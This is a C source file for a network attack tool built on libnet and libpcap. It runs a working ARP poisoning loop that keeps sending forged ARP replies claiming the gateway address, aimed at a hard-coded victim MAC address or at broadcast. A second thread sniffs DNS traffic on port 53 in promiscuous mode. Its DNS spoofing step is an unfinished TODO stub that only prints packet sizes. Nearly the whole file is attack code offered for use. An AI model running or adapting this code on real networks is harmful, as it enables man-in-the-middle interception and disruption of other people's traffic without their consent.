#include <libnet.h>
#include <stdlib.h>
#include <pcap.h>
#include <pthread.h>

#define COLOR_RED "\x1b[31m"
#define COLOR_GREEN "\x1b[32m"
#define COLOR_RESET "\x1b[0m"

/**
 * Checks whether user provided all arguments and run the program as root.
 * If not appropriate error message is displayed and program is terminated.
 * @param argc number of arguments
 * @param argv array of arguments
 */
void check_prerequisites(int argc, char **argv)
{
  const int is_user_root = getuid() == 0;
  if (!is_user_root)
  {
    fprintf(stderr, COLOR_RED "You must be root to run this program." COLOR_RESET "\n");
    exit(EXIT_FAILURE);
  }

  const int are_all_args_provided = argc == 3;
  if (!are_all_args_provided)
  {
    fprintf(stderr, COLOR_RED "Missing Arguments.\n" COLOR_RESET "Usage: %s INTERFACE_NAME GATEWAY_IP_ADDR\nExample: %s wlo1 192.168.0.1\n", argv[0], argv[0]);
    exit(EXIT_FAILURE);
  }
}
/**
 * Contiously sends fake ARP responses.
 * @param interface_name name of the interface through which the fake packets will be sent (eg. "wlo1")
 * @param gateway_ip_addr IP address of the gateway (eg. "192.168.0.1")
 * @param jam_all flag indicating whether arp responses should be sent as broadcast or to a specific MAC address
 */
void start_arp_poisoning(char *interface_name, char *gateway_ip_addr, int jam_all)
{
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  u_int8_t victim_hw_addr[6] = {0x2c, 0xf0, 0x5d, 0xae, 0xe4, 0x01};

  struct libnet_ether_addr *src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, gateway_ip_addr, LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  libnet_autobuild_arp(
      ARPOP_REPLY,                              /* operation type       */
      src_hw_addr->ether_addr_octet,            /* sender hardware addr */
      (u_int8_t *)&target_ip_addr,              /* gateway ip addr      */
      jam_all ? bcast_hw_addr : victim_hw_addr, /* victim hardware addr */
      (u_int8_t *)&zero_ip_addr,                /* victim protocol addr */
      ln);                                      /* libnet context       */
  libnet_autobuild_ethernet(
      jam_all ? bcast_hw_addr : victim_hw_addr, /* ethernet destination */
      ETHERTYPE_ARP,                            /* ethertype            */
      ln);                                      /* libnet context       */

  printf(COLOR_GREEN "Sending ARP packets..." COLOR_RESET "\n");
  while (1)
  {
    libnet_write(ln);
    sleep(5);
  }
  libnet_destroy(ln);
}

//===================================================
// DNS sniffing and spoofing
//===================================================
char *errbuf;
pcap_t *handle;

void cleanup()
{
  pcap_close(handle);
  free(errbuf);
}

void stop(int signo)
{
  exit(EXIT_SUCCESS);
}
/**
 * Creates a fake dns response and sends it back to the client.
 */
void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
{
  printf("[%dB of %dB]\n", h->caplen, h->len);
  // TODO Send fake dns response
}
/**
 * Sets up libpcap and starts sniffing for dns packets. When a dns packet is sniffed, it calls the
 * trap function. This function has to be started in a separate thread, because "pcap_loop" blocks.
 * @param interface_name name of the interface on which libpcap will sniff (eg. "wlo1")
 */
void *sniff_and_fake_dns_packets(void *interface_name)
{
  bpf_u_int32 netp, maskp;
  struct bpf_program fp;

  atexit(cleanup);
  signal(SIGINT, stop);
  errbuf = malloc(PCAP_ERRBUF_SIZE);
  handle = pcap_create(interface_name, errbuf);
  pcap_set_promisc(handle, 1);
  pcap_set_snaplen(handle, 65535);
  pcap_set_timeout(handle, 1000);
  pcap_activate(handle);
  pcap_lookupnet(interface_name, &netp, &maskp, errbuf);
  pcap_compile(handle, &fp, "udp and port 53", 0, maskp);
  // pcap_compile(handle, &fp, "udp and port 53 and host 192.168.0.38", 0, maskp);
  if (pcap_setfilter(handle, &fp) < 0)
  {
    pcap_perror(handle, "pcap_setfilter()");
    exit(EXIT_FAILURE);
  }
  pcap_loop(handle, -1, trap, NULL);
  return NULL;
}
//===================================================
int main(int argc, char **argv)
{
  check_prerequisites(argc, argv);

  pthread_t pth1;
  pthread_create(&pth1, NULL, sniff_and_fake_dns_packets, argv[1]);

  start_arp_poisoning(argv[1], argv[2], 0);

  return EXIT_SUCCESS;
}
